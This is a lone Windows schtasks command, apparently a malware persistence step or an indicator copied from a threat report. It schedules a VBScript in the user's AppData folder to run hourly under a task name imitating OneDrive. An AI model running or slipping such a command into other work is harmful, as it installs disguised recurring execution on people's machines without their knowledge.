schtasks /create /tn "OneDriveCs" /sc minute /mo 60 /tr "%appdata%\script.vbs"

